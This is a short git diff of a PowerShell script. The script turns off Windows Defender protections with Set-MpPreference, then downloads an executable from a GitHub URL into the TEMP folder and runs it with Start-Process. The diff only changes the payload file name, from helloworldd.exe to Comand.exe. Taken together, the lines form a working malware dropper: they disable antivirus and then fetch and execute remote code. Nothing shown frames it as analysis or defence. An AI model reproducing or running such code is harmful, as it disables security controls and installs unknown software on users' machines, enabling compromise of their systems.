@@ -26,7 +26,7 @@ Set-MpPreference -DisableIOAVProtection $true
 Set-MpPreference -DisableScriptScanning $true
 
 # ============ DOWNLOAD + RUN EXE ============
-$url = "https://github.com/analysisw/test/raw/refs/heads/main/helloworldd.exe"
-$out = Join-Path $env:TEMP "helloworldd.exe"
+$url = "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe"
+$out = Join-Path $env:TEMP "Comand.exe"
 Invoke-WebRequest -Uri $url -OutFile $out
 Start-Process $out
